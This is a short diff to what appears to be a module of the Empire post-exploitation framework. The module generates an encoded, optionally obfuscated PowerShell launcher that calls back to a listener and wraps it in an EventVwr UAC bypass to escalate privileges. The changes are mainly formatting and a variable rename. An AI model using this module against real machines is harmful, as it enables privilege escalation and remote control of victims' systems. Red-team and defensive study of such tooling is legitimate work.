@@ -12,19 +12,20 @@ from empire.server.utils.module_util import handle_error_message
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
+                 obfuscation_command: str = ""):
         # Set booleans to false by default
-        Obfuscate = False
+        obfuscate = False
 
         listenerName = params['Listener']
 
         # staging options
         userAgent = params['UserAgent']
-        
+
         proxy = params['Proxy']
         proxyCreds = params['ProxyCreds']
         if (params['Obfuscate']).lower() == 'true':
-            Obfuscate = True
+            obfuscate = True
         ObfuscateCommand = params['ObfuscateCommand']
 
         # read in the common module source code
@@ -48,7 +49,7 @@ class Module(object):
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
-                                                           obfuscate=Obfuscate,
+                                                           obfuscate=obfuscate,
                                                            obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
                                                            proxy=proxy,
                                                            proxyCreds=proxyCreds, bypasses=params['Bypasses'])
@@ -60,9 +61,9 @@ class Module(object):
                 scriptEnd = "Invoke-EventVwrBypass -Command \"%s\"" % (encScript)
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
+            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd,
+                                          obfuscationCommand=obfuscation_command)
         script += scriptEnd
         script = data_util.keyword_obfuscation(script)
 
         return script
-
